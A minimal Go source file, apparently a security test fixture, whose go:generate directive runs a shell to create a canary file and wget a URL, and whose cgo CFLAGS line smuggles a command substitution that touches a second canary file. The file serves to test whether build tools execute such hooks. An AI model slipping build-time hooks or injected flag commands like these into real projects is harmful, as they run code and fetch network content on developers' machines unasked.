package main

//go:generate sh -c "touch /tmp/canary-generate; wget -q http://example.com/x"

/*
#cgo CFLAGS: -DX=$(touch /tmp/canary-cgo)
#include <stdio.h>
*/
import "C"

func main() {}
